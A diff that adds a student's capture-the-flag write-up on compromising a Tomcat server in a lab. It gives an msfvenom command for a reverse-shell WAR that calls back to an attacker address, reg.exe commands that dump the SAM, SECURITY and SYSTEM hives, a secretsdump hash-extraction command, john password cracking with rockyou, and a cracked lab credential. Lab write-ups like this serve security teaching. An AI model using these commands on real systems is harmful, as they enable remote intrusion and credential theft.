@@ -1,1 +1,26 @@
 flag{f9038f}:
+flag{9f1f16}: Start: Monday End: Tuesday TOTAL h spend: 7h
+Fisrt of all, once we have access to a Tomcat server, I searched different ways to exploit the host. I finally readed that one way to do that was by uploading a malicious WAR 
+file. So I decided to create a file called "file.war" and put malicious code that enabled me to open a shell toward the host of the Tomcat server.
+Then I used MSFvenom to create the WAR file so that I can simply pick up the shell, doing
+                                    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.6 LPORT=6666 -f war > file.war
+
+Then I needed this three files:
+C:\> reg.exe save hklm\sam c:\inetpub\ftproot\sam.save
+C:\> reg.exe save hklm\security c:\inetpub\ftproot\security.save
+C:\> reg.exe save hklm\system c:\inetpub\ftproot\system.save
+That I got them from the Tomcat server.
+
+for executing:
+                                    python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+this pyhton script,secretsdump.py is a tool used to extract sensitive information, such as passwords and secrets, from Windows systems. So I use it to have my hash list and then 
+store the output using ─$ python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL > ntlm 
+then I was able to make the hash craking using john. I tried other ways to make hash craking such as hascat but I was not able to run them.
+So I run:
+                                          john --format=NT --wordlist=rockyou.txt ntlm   
+previously having unzip the rockyou file and got different users and passwords
+
+Then I didn't know what to do for hours and used one of the hints that told me to use telnet.
+So I used telned, entered with the user and password provided by john that was user: (mr_babbage)  password: sunburnt.
+finally I entered and made an ls to get the flag.
